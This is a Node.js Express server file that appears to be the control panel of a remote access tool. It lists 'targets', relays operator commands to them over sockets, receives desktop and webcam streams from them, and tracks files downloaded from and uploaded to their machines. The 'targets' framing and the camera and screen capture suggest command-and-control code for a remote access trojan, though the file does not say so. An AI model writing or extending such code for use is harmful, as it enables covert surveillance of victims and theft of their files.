// my modules
var core = require("./core");
var sock_server = require('./sock_server');
var webSrv = require('./webSrv');

var express = require("express");
var app = express();
var expressWs = require('express-ws')(app);

var net = require("net")
var path = require("path");
var util = require("util");
var colors = require("colors");
var events = require("events");


// set the view engine to ejs
app.set('view engine', 'ejs');

// handle static files
app.use('/static', express.static( path.join(__dirname, 'static')));
app.use('/fonts', express.static( path.join(__dirname, 'static','fonts')));

// Dashboard page
app.get("/", function(req, res){
	res.render(path.join(__dirname,"views","index"),
	{
		targets: targets,
		missed_notifs: missed_notifs,
		nb_msg_notifs: webSrv.utils.nb_msg_notifs(missed_notifs),
		nb_notifs: webSrv.utils.nb_notifs(missed_notifs)
	});
});

// communication with target
app.get("/communication", function(req, res){
	
	core.db_ops.get_target_info(req.query.id, function(err, target_info){
		for(i=0; i < missed_notifs.length; i++)
		{
			util.log("missed : "+missed_notifs[i].body);
		}
		if(err)
		{
			res.render(path.join(__dirname,"views","500"),
				{
					err: err,
					targets: targets,
					missed_notifs: missed_notifs
				});
		}
		else
		{	
			core.db_ops.get_recent_msgs(req.query.id, function(err, msgs){
				if(err)
				{
					res.render(path.join(__dirname,"views","500"),
					{
						err: err,
						targets: targets,
						missed_notifs: missed_notifs
					});
				}
				else
				{
					target_info = webSrv.utils.enhance_var(target_info);
					res.render(path.join(__dirname,"views","communication"),
					{
						msgs: msgs,
						info: target_info,
						targets: targets,
						missed_notifs: missed_notifs,
						nb_msg_notifs: webSrv.utils.nb_msg_notifs(missed_notifs),
						nb_notifs: webSrv.utils.nb_notifs(missed_notifs)
					});
				}
			});

			
		}
		missed_notifs = [];
	});
});

// handle websocket notifications
app.ws("/notifications", function(ws, req){
	global.ws = ws;
	ws.on("message",sock_server.send_cmd);
});

// get total number of messages
app.get("/total_msgs", function(req, res){
	core.db_ops.get_total_msgs_nb(function(err, nb){
		if(err)
		{
			res.send({"error": err.message, "data":""});
		}
		else
		{
			res.send({"error": false, data: nb});
		}
	});
});

// get number of downloaded files
app.get("/nb_downloads", function(req, res){
	core.db_ops.get_nb_downloads(function(err, nb){
		if(err)
		{
			res.send({"error": err.message, "data":""});
		}
		else
		{
			res.send({"error": false, data: nb});
		}
	});
});

// get total number of targets
app.get("/nb_targets", function(req, res){
	core.db_ops.get_nb_targets(function(err, nb){
		if(err)
		{
			res.send({"error": err.message, "data":""});
		}
		else
		{
			res.send({"error": false, data: nb});
		}
	});
});

// get number of uploaded files
app.get("/nb_uploads", function(req, res){
	core.db_ops.get_nb_uploads(function(err, nb){
		if(err)
		{
			res.send({"error": err.message, "data":""});
		}
		else
		{
			res.send({"error": false, data: nb});
		}
	});
});

// get custom commands
app.get("/get_cmds", function(req, res){
	res.send(core.config.CUSTOM_COMMANDS);
});

// get ffmpeg devices
app.get("/get_ffmpeg_devs", function(req, res){

	if(req.query.id)
	{
		core.db_ops.get_ffmpeg_devs(req.query.id, function(err, devs){
			if(err)
			{
				util.log(("[get_ffmpeg_devs] Error : "+ err.message).red);
			}
			else if(devs)
			{
				res.send(JSON.parse('{"video_devs": '+devs.video_devs+'}'));	
			}
			else
			{
				util.log("No ffmpeg_devs found for : " + req.query.id );
			}
		});
	}
	else
	{
		res.send(JSON.parse('{"error": "unspecified \'id\' parameter"}'));
	}
	
});

// handle desktop/webcam streaming (from target)
app.ws("/stream", function(ws_stream, req){
	global.ws_stream = ws_stream;
});

// get recent msg from history
app.get("/recent_msgs", function(req, res,){
	core.db_ops.get_recent_msgs(req.query.id, function(err, msgs){
		if(err)
		{
			util.log(("[get_recent_msgs] Error : "+ err.message).red);
		}
		else
		{
			res.send(msgs);	
		}
	})
});

// get TimeLine
app.get("/timeline", function(req, res){
	core.db_ops.get_timeLine(req.query.id, function(err, rows){
		if(err)
		{
			util.log(("[get_timeLine] Error : "+ err.message).red);
		}
		else
		{
			res.send(rows);	
		}
	});
});

// handle http errors
app.use(function(req, res, next) {
    res.render(path.join(__dirname,"views","404"));
});

// starting socket work
global.targets = [];
// when server recieves notifs before we open web UI
global.missed_notifs = [];

// detect downloading finish and see if there are other from the same target.
// remainder : we download only one file at the same time from specific target
global.download_evt = new events.EventEmitter();
download_evt.on("finish", sock_server.send_cmd);

sock_server.start();
core.streaming.start();
core.ftp.start();

app.listen(core.config.WEB_PORT, function(){
	util.log("Server started on localhost:80 -- press Ctrl-C to terminate...\n".cyan);
});
